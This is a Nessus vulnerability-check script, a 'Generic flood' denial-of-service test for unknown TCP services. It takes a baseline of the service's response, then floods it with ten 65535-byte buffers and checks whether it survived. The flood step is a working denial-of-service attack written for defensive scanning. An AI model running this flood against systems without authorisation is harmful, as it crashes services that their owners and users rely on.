#
# This script was written by Michel Arboi <arboi@alussinan.org>, starting 
# from winnuke.nasl, then fixed and heavily hacked by Renaud Deraison
# (as usual :) 
#
# Should cover bid 7345
#
# See the Nessus Scripts License for details
#
# Services known to crash or freeze on too much data:
# Calisto Internet Talker Version 0.04 and prior
#
################
# References
################
#
# From: "subversive " <subversive@linuxmail.org>
# To: bugtraq@securityfocus.com, vulnwatch@vulnwatch.org
# Date: Mon, 25 Nov 2002 09:33:49 +0800
# Subject: SFAD02-002: Calisto Internet Talker Remote DOS
#

if(description)
{
 script_id(10735);
 script_version ("$Revision: 1.22 $");
 
 name["english"] = "Generic flood";
 name["francais"] = "Surcharge générique";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to crash the remote service by flooding it with too much data.

An attacker may use this flaw to make this service crash continuously, 
preventing this service from working properly. It may also be possible
to exploit this flaw to execute arbitrary code on this host.


Solution : upgrade your software or contact your vendor and inform it of this 
vulnerability
Risk factor : High";


 desc["francais"] = "Il a été possible de tuer 
le service distant en l'inondant de données.

Un pirate peut exploiter cette faille 
pour faire planter continuellement ce
service, vous empêchant ainsi de travailler
correctement.


Solution: mettez à jour votre logiciel ou 
contactez votre vendeur et informez-le de cette
vulnérabilité.

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Flood against the remote service";
 summary["francais"] = "Surcharge du service distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 # Maybe we should set this to ACT_DESTRUCTIVE_ATTACK only?
 if (ACT_FLOOD) script_category(ACT_FLOOD);
 else		script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison & Michel Arboi",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison & Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";

 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/unknown");
 exit(0);
}

#

include('misc_func.inc');
port = get_unknown_svc();
if (! port) exit(0);
if (! get_port_state(port)) exit(0);

 soc = open_sock_tcp(port);
 if (! soc)
 {
  exit(0);
 }

 r = recv(socket:soc, length:4096, timeout:5);
 if(!r) has_banner = 0;
 else has_banner = 1;
 if(!has_banner)
 {
   send(socket:soc, data:string("HELP\r\n"));
   r = recv(socket:soc, length:4096, timeout:5);
   if(r)replies_to_help = 1;
   else replies_to_help = 0;
 }

 close(soc);


 soc = open_sock_tcp(port);
 if ( soc )
 {
 send(socket:soc, data:crap(65535)) x 10;
 close(soc);
 }
 
 soc = open_sock_tcp(port);
 if(!soc)
 {
  security_hole(port);
 }
 else
 {
  if(has_banner)
  {
   r = recv(socket:soc, length:4096, timeout:10);
   if(!r) {
    security_hole(port);
   }
  }
  else
  {
   if(replies_to_help)
   {
    send(socket:soc, data:string("HELP\r\n"));
    r =  recv(socket:soc, length:4096, timeout:10);
    if(!r)
    {
     security_hole(port);
    }
   }
  }
 }

